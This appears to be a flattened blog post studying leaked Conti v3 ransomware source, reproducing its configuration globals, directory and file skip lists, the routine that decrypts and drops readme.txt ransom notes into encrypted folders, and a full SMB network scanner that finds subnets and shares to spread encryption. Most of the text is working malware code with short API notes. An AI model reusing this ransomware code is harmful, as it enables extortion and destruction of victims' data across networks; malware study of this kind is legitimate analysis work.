1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980STATIC WCHAR g_Extention[7] = L&quot;.EXTEN&quot;;STATIC CHAR g_DecryptNote[2048] = &quot;__DECRYPT_NOTE__&quot;;STATIC INT g_EncryptMode = ALL_ENCRYPT;STATIC BOOL g_IsProcKillerEnabled = FALSE;STATIC LPCWSTR g_EncryptPath = NULL;STATIC BYTE g_EncryptSize = 50;//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;PWCHAR global::GetExtention(){ return g_Extention;}PCHAR global::GetDecryptNote(){ return g_DecryptNote;}PCHARglobal::GetMutexName(){ //return g_MutexName; return NULL;}VOIDglobal::SetEncryptMode(INT EncryptMode){ g_EncryptMode = EncryptMode;}INTglobal::GetEncryptMode(){ return g_EncryptMode;}VOIDglobal::SetProcKiller(BOOL IsEnabled){ g_IsProcKillerEnabled = IsEnabled;}BOOL global::GetProcKiller(){ return g_IsProcKillerEnabled;}VOID global::SetEncryptPath(__in LPCWSTR Path){ g_EncryptPath = Path;}LPCWSTRglobal::GetEncryptPath(){ return g_EncryptPath;}BOOL global::SetEncryptSize(__in INT Size){ if (Size != 10 || Size != 15 || Size != 20 || Size != 25 || Size != 30 || Size != 35 || Size != 40 || Size != 45 || Size != 50 || Size != 60 || Size != 70 || Size != 80) { g_EncryptSize = 50; logs va_start va_arg va_end The RtlSecureZeroMemory routine fills a block of memory with zeros in a way that is guaranteed to be secure. init init in function main: 1234567LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(L&quot;-log&quot;));if (LogFile) { logs::Init(LogFile);} 1234567891011121314logs::Init(LPCWSTR LogFile){ pInitializeCriticalSection(&amp;g_CritSec); g_LogHandle = pCreateFileW( LogFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_FLAG_WRITE_THROUGH, NULL); pSetFilePointer(g_LogHandle, 0, NULL, FILE_END);} writewrite some errors. 1logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError()); filesystemdisks SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(0, NULL); pGetLogicalDriveStringsW(BufferLength, Buffer); GetLogicalDriveStringsW 1234DWORD GetLogicalDriveStringsW([in] DWORD nBufferLength,[out] LPWSTR lpBuffer); If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes. If the buffer is not large enough, the return value is greater than nBufferLength. It is the size of the buffer required to hold the drive strings. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &quot;filesystem.h&quot;#include &quot;../api/getapi.h&quot;#include &quot;../memory.h&quot;#include &quot;../logs/logs.h&quot;INT filesystem::EnumirateDrives(__in PDRIVE_LIST DriveList){ INT Length = 0; INT DrivesCount = 0; DWORD DriveType = 0; TAILQ_INIT(DriveList); SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(0, NULL); if (!BufferLength) { return 0; } LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + 1) * sizeof(WCHAR)); if (!Buffer) { return 0; } pGetLogicalDriveStringsW(BufferLength, Buffer); LPWSTR tempBuffer = Buffer; while (Length = (INT)plstrlenW(tempBuffer)) { PDRIVE_INFO DriveInfo = new DRIVE_INFO; if (!DriveInfo) { free(Buffer); return 0; } DriveInfo-&gt;RootPath = tempBuffer; TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries); DrivesCount++; tempBuffer += Length + 1; } logs::Write(OBFW(L&quot;Found %d drives: &quot;), DrivesCount); PDRIVE_INFO DriveInfo = NULL; TAILQ_FOREACH(DriveInfo, DriveList, Entries) { logs::Write(OBFW(L&quot;%s&quot;), DriveInfo-&gt;RootPath.c_str()); } free(Buffer); return DrivesCount;} search MakeSearchMask used to generate a search mask path MakePath used to generate the file path CheckDirectory check if the directory is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking. ``` OBFW(L”tmp”), OBFW(L”winnt”), OBFW(L”temp”), OBFW(L”thumb”), OBFW(L”$Recycle.Bin”), OBFW(L”$RECYCLE.BIN”), OBFW(L”System Volume Information”), OBFW(L”Boot”), OBFW(L”Windows”), OBFW(L”Trend Micro”), OBFW(L”perflogs”) 1234567891011121314- CheckFilename - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking. - ``` OBFW(L&quot;.exe&quot;), OBFW(L&quot;.dll&quot;), OBFW(L&quot;.lnk&quot;), OBFW(L&quot;.sys&quot;), OBFW(L&quot;.msi&quot;), OBFW(L&quot;readme.txt&quot;), OBFW(L&quot;CONTI_LOG.txt&quot;), OBFW(L&quot;.bat&quot;) DropInstruction release the reame.txt to every directory that is encrypted by Ransomeware. the DecryptionNotes is encrypted with chacha the first 16 bytes is the key the 16-20 bytes is the iv the follow is the encrypted data SearchFiles DropInstruction12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849DropInstruction(__in std::wstring Directory){ LPCWSTR str = OBFW(L&quot;readme.txt&quot;); std::wstring Filename = MakePath(Directory, str); HANDLE hFile = pCreateFileW( Filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL); if (hFile == INVALID_HANDLE_VALUE) { return; } DWORD dwDecryptNote = 0; LPSTR DecryptNote = global::GetDecryptNote(); ECRYPT_ctx CryptCtx; BYTE ChaChaKey[32]; BYTE ChaChaIV[8]; memcpy(ChaChaKey, DecryptNote, 32); memcpy(ChaChaIV, DecryptNote + 32, 8); memcpy(&amp;dwDecryptNote, DecryptNote + 40, 4); LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote); if (!DecryptNotePlainText) { pCloseHandle(hFile); return; } RtlSecureZeroMemory(&amp;CryptCtx, sizeof(CryptCtx)); ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, 256, 64); ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV); ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + 44, (PBYTE)DecryptNotePlainText, dwDecryptNote); DWORD BytesWritten; pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, NULL); pCloseHandle(hFile); RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote); free(DecryptNotePlainText);} networkscannercomplex network scanner code. PortScanHandler pGetQueuedCompletionStatus pPostQueuedCompletionStatus START_COMPLETION_KEY CONNECT_COMPLETION_KEY TIMER_COMPLETION_KEY CancelIo Cancels all pending input and output (I/O) operations that are issued by the calling thread for the specified file. The function does not cancel I/O operations that other threads issue for a file handle. shutdown The shutdown function disables sends or receives on a socket. TimerCallback if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } 12345678910111213- a callback function that used with PostQueuedCompletionStatus. - ```c BOOL CreateTimerQueueTimer( [out] PHANDLE phNewTimer, [in, optional] HANDLE TimerQueue, [in] WAITORTIMERCALLBACK Callback, [in, optional] PVOID Parameter, [in] DWORD DueTime, [in] DWORD Period, [in] ULONG Flags ); The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time. so 30000 / 1000 = 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket 123456789101112131415161718192021222324252627282930313233343536373839404142else if (CompletionStatus == TIMER_COMPLETION_KEY) { IsTimerActivated = TRUE; if (g_ActiveOperations) { PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { if (ConnectCtx-&gt;State == CONNECTING) { pCancelIo((HANDLE)ConnectCtx-&gt;s); } } } else { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } }} EnumShares NetShareEnum Retrieves information about each shared resource on a server. sharepath Constant/value Description STYPE_DISKTREE0x00000000 Disk drive STYPE_SPECIAL0x80000000 Special share reserved for interprocess communication (IPC$) or remote administration of the server (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth. STYPE_TEMPORARY0x40000000 A temporary share that is not persisted for creation each time the file server initializes. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051VOIDnetwork_scanner::EnumShares( __in PWCHAR pwszIpAddress, __out PSHARE_LIST ShareList ){ NET_API_STATUS Result; LPSHARE_INFO_1 ShareInfoBuffer = NULL; DWORD er = 0, tr = 0, resume = 0;; do { Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, 1, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume); if (Result == ERROR_SUCCESS) { LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer; for (DWORD i = 1; i &lt;= er; i++) { if (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE || TempShareInfo-&gt;shi1_type == STYPE_SPECIAL || TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) { PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO)); if (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(L&quot;ADMIN$&quot;))) { plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(L&quot;\\\\\\\\&quot;)); plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress); plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(L&quot;\\\\&quot;)); plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname); logs::Write(OBFW(L&quot;Found share %s.&quot;), ShareInfo-&gt;wszSharePath); TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries); } } TempShareInfo++; } pNetApiBufferFree(ShareInfoBuffer); } } while (Result == ERROR_MORE_DATA);} StartScan1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374network_scanner::StartScan(){ WSADATA WsaData; HANDLE hHostHandler = NULL, hPortScan = NULL; PSUBNET_INFO SubnetInfo = NULL; g_ActiveOperations = 0; pWSAStartup(MAKEWORD(2, 2), &amp;WsaData); pInitializeCriticalSection(&amp;g_CriticalSection); if (!GetConnectEX()) { logs::Write(OBFW(L&quot;Can't get ConnectEx.&quot;)); goto cleanup; } GetCurrentIpAddress(); g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0); if (g_IocpHandle == NULL) { logs::Write(OBFW(L&quot;Can't create io completion port.&quot;)); goto cleanup; } TAILQ_INIT(&amp;g_SubnetList); TAILQ_INIT(&amp;g_HostList); TAILQ_INIT(&amp;g_ConnectionList); if (!GetSubnets(&amp;g_SubnetList)) { logs::Write(OBFW(L&quot;Can't get subnets.&quot;)); goto cleanup; } hHostHandler = pCreateThread(NULL, 0, &amp;HostHandler, NULL, 0, NULL); if (hHostHandler == INVALID_HANDLE_VALUE) { logs::Write(OBFW(L&quot;Can't create host thread.&quot;)); goto cleanup; } hPortScan = pCreateThread(NULL, 0, &amp;PortScanHandler, NULL, 0, NULL); if (hPortScan == INVALID_HANDLE_VALUE) { logs::Write(OBFW(L&quot;Can't create port scan thread.&quot;)); goto cleanup; } pPostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL); pWaitForSingleObject(hPortScan, INFINITE); AddHost(STOP_MARKER); pWaitForSingleObject(hHostHandler, INFINITE);cleanup: pDeleteCriticalSection(&amp;g_CriticalSection); if (g_IocpHandle) { pCloseHandle(g_IocpHandle); } if (hHostHandler) { pCloseHandle(hHostHandler); } if (hPortScan) { pCloseHandle(hPortScan); } pWSACleanup();} GetCurrentIpAddress pgethostname SOCKET_ERROR == (INT)pgethostname(szHostName, 256) g_HostEntry = (struct hostent*)pgethostbyname(szHostName); If no error occurs, gethostname returns zero. Otherwise, it returns SOCKET_ERROR and a specific error code can be retrieved by calling WSAGetLastError. 1234567891011121314151617STATICDWORD GetCurrentIpAddress(){ CHAR szHostName[256]; struct in_addr InAddr; if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) { return 0; } g_HostEntry = (struct hostent*)pgethostbyname(szHostName); if (!g_HostEntry) { return 0; } return 0;} GetConnectEX WSASocketW creates a socket that is bound to a specific transport-service provider WSAIoctl controls the mode of a socket. closesocket 1234567891011121314151617181920212223242526STATICBOOLGetConnectEX(){ DWORD dwBytes; int rc; SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); if (sock == INVALID_SOCKET) return FALSE; GUID guid = WSAID_CONNECTEX; rc = (int)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER, &amp;guid, sizeof(guid), &amp;g_ConnectEx, sizeof(g_ConnectEx), &amp;dwBytes, NULL, NULL); if (rc != 0) return FALSE; rc =(int) pclosesocket(sock); if (rc != 0) return FALSE; return TRUE;} GetSubnets GetIpNetTable GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size) ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result) The GetIfTable function retrieves the MIB-II interface table. if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host. And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576 IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize); if (!IpNetTable) { return FALSE; } ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE); if (Result != ERROR_SUCCESS) { logs::Write(OBFW(L&quot;GetIpNetTable fails. GetLastError = %lu&quot;), pGetLastError()); free(IpNetTable); return FALSE; } for (ULONG i = 0; i &lt; IpNetTable-&gt;dwNumEntries; i++) { WCHAR wszIpAddress[INET_ADDRSTRLEN]; ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr; PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr; ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen; RtlSecureZeroMemory(wszIpAddress, sizeof(wszIpAddress)); IN_ADDR InAddr; InAddr.S_un.S_addr = dwAddress; PCHAR szIpAddress = pinet_ntoa(InAddr); DWORD le = WSAGetLastError(); PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;172.&quot;)); PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;192.168.&quot;)); PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;10.&quot;)); PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;169.&quot;)); if (p1 == szIpAddress || p2 == szIpAddress || p3 == szIpAddress || p4 == szIpAddress) { BOOL Found = FALSE; PSUBNET_INFO SubnetInfo = NULL; TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) { if (!memcmp(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, 3)) { Found = TRUE; break; } } if (!Found) { BYTE bAddres[4]; *(ULONG*)bAddres = dwAddress; bAddres[3] = 0; PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(sizeof(SUBNET_INFO)); if (!NewSubnet) { break; } RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, 4); TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries); } } } free(IpNetTable); return TRUE;} HostHandler pEnterCriticalSection(&amp;g_CriticalSection); When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.Critical Section in Synchronization ```c pEnterCriticalSection(&amp;g_CriticalSection); PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList); if (HostInfo == NULL) { pLeaveCriticalSection(&amp;g_CriticalSection); pSleep(1000); continue; } TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries); pLeaveCriticalSection(&amp;g_CriticalSection); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);` - get the host's shareinfo - `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);````cSTATICDWORDWINAPIHostHandler(__in PVOID pArg){ network_scanner::SHARE_LIST ShareList; TAILQ_INIT(&amp;ShareList); while (TRUE) { pEnterCriticalSection(&amp;g_CriticalSection); PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList); if (HostInfo == NULL) { pLeaveCriticalSection(&amp;g_CriticalSection); pSleep(1000); continue; } TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries); pLeaveCriticalSection(&amp;g_CriticalSection); if (HostInfo-&gt;dwAddres == STOP_MARKER) { free(HostInfo); pExitThread(EXIT_SUCCESS); } network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList); while (!TAILQ_EMPTY(&amp;ShareList)) { network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList); logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath); threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath); TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries); free(ShareInfo); } free(HostInfo); } pExitThread(EXIT_SUCCESS); return EXIT_SUCCESS;} CreateHostTable WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); socket with tcp bind The bind function associates a local address with a socket. CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0) Creates an input/output (I/O) completion port and associates it with a specified file handle, or creates an I/O completion port that is not yet associated with a file handle, allowing association at a later time. If the function succeeds, the return value is the handle to an I/O completion port 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263STATICBOOLCreateHostTable(){ PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList); if (!SubnetInfo) { return FALSE; } BYTE bAddres[4]; DWORD dwAddress; RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, 4); for (BYTE i = 0; i &lt; 255; i++) { bAddres[3] = i; RtlCopyMemory(&amp;dwAddress, bAddres, 4); PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT)); if (!ConnectCtx) { break; } ConnectCtx-&gt;dwAddres = dwAddress; ConnectCtx-&gt;State = NOT_CONNECTED; ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); if (ConnectCtx-&gt;s == INVALID_SOCKET) { pGlobalFree(ConnectCtx); continue; } SOCKADDR_IN SockAddr; RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr)); SockAddr.sin_family = AF_INET; SockAddr.sin_port = 0; SockAddr.sin_addr.s_addr = INADDR_ANY; if (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) { pclosesocket(ConnectCtx-&gt;s); pGlobalFree(ConnectCtx); continue; } if (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) { pclosesocket(ConnectCtx-&gt;s); pGlobalFree(ConnectCtx); continue; } TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries); } TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries); free(SubnetInfo); return TRUE;} ScanHosts ConnectEx The ConnectEx function establishes a connection to a specified socket, and optionally sends data once the connection is established. The ConnectEx function is only supported on connection-oriented sockets. ``` LPFN_CONNECTEX LpfnConnectex; BOOL LpfnConnectex([in] SOCKET s,[in] const sockaddr *name,[in] int namelen,[in, optional] PVOID lpSendBuffer,[in] DWORD dwSendDataLength,[out] LPDWORD lpdwBytesSent,[in] LPOVERLAPPED lpOverlapped ) {…} 123456789101112131415161718192021222324252627282930```cSTATICVOIDScanHosts(){ PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { DWORD dwBytesSent; SOCKADDR_IN SockAddr; RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr)); SockAddr.sin_family = AF_INET; SockAddr.sin_port = htons(SMB_PORT); SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres; if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) { ConnectCtx-&gt;State = CONNECTED; AddHost(ConnectCtx-&gt;dwAddres); } else if (WSA_IO_PENDING == WSAGetLastError()) { g_ActiveOperations++; ConnectCtx-&gt;State = CONNECTING; } }} AddHost add the new-found host to the Host table 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849STATICBOOLAddHost( __in DWORD dwAddres){ if (g_HostEntry) { INT i = 0; while (g_HostEntry-&gt;h_addr_list[i] != NULL) { DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++]; if (dwCurrentAddr == dwAddres) { return FALSE; } } } PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(sizeof(HOST_INFO)); if (!HostInfo) { return FALSE; } DWORD dwAddress = INET_ADDRSTRLEN; SOCKADDR_IN temp; temp.sin_addr.s_addr = dwAddres; temp.sin_port = 0; temp.sin_family = AF_INET; HostInfo-&gt;dwAddres = dwAddres; if (dwAddres != STOP_MARKER) { if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, sizeof(temp), NULL, HostInfo-&gt;wszAddress, &amp;dwAddres)) { free(HostInfo); return FALSE; } } pEnterCriticalSection(&amp;g_CriticalSection); { TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries); } pLeaveCriticalSection(&amp;g_CriticalSection); return TRUE;} PortScanHandlerthis handler use the CompletionStatus,IsTimerActivated,g_ActiveOperations to control the code flow. g_ActiveOperations use to count the Socket. ScanHosts function: when one host is found ,the value is add by one if CompletionStatus == CONNECT_COMPLETION_KEY, the value sub by one. IsTimerActivated used to check after the timer. IsTimerActivated is True, four scenes CompletionStatus == CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success if g_ActiveOperations is zero ,then scanHost again 12345678910111213141516171819202122232425if (!g_ActiveOperations &amp;&amp; IsTimerActivated) { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) { ConnectContext-&gt;State = CONNECTED; AddHost(ConnectContext-&gt;dwAddres); } CompletionStatus == CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail the same as before 12345else { ConnectContext-&gt;State = NOT_CONNECTED; } CompletionStatus == TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now. 123456789101112if (g_ActiveOperations) { PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { if (ConnectCtx-&gt;State == CONNECTING) { pCancelIo((HANDLE)ConnectCtx-&gt;s); } } } CompletionStatus == TIMER_COMPLETION_KEY and g_ActiveOperations == 0 , the socket is out-of-time. 123456789101112131415161718192021222324else { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } CompletionStatus A pointer to a variable that receives the completion key value associated with the file handle whose I/O operation has completed. A completion key is a per-file key that is specified in a call to CreateIoCompletionPort. START_COMPLETION_KEY CONNECT_COMPLETION_KEY TIMER_COMPLETION_KEY PortScanHandler pGetQueuedCompletionStatus pPostQueuedCompletionStatus CancelIo Cancels all pending input and output (I/O) operations that are issued by the calling thread for the specified file. The function does not cancel I/O operations that other threads issue for a file handle. shutdown The shutdown function disables sends or receives on a socket. TimerCallback if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } 12345678910111213- a callback function that used with PostQueuedCompletionStatus. - ```c BOOL CreateTimerQueueTimer( [out] PHANDLE phNewTimer, [in, optional] HANDLE TimerQueue, [in] WAITORTIMERCALLBACK Callback, [in, optional] PVOID Parameter, [in] DWORD DueTime, [in] DWORD Period, [in] ULONG Flags ); The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time. so 30000 / 1000 = 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125STATICDWORDWINAPIPortScanHandler(PVOID pArg){ g_ActiveOperations = 0; HANDLE hTimer = NULL; BOOL IsTimerActivated = FALSE; HANDLE hTimerQueue = pCreateTimerQueue(); if (!hTimerQueue) { pExitThread(EXIT_FAILURE); } while (TRUE) { DWORD dwBytesTransferred; ULONG_PTR CompletionStatus; PCONNECT_CONTEXT ConnectContext; BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE); if (CompletionStatus == START_COMPLETION_KEY) { if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } else if (CompletionStatus == CONNECT_COMPLETION_KEY) { g_ActiveOperations--; if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) { ConnectContext-&gt;State = CONNECTED; AddHost(ConnectContext-&gt;dwAddres); } else { ConnectContext-&gt;State = NOT_CONNECTED; } if (!g_ActiveOperations &amp;&amp; IsTimerActivated) { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } } else if (CompletionStatus == TIMER_COMPLETION_KEY) { IsTimerActivated = TRUE; if (g_ActiveOperations) { PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { if (ConnectCtx-&gt;State == CONNECTING) { pCancelIo((HANDLE)ConnectCtx-&gt;s); } } } else { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } } } pDeleteTimerQueue(hTimerQueue); pExitThread(EXIT_SUCCESS); return EXIT_SUCCESS;} Reference: MSDN Critical Section in Synchronization","link":"/2022/04/18/conti%20v3%20source%20code%20learning/"}],"tags":[{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"msvc","slug":"msvc","link":"/tags/msvc/"},{"name":"ollvm dumpulator 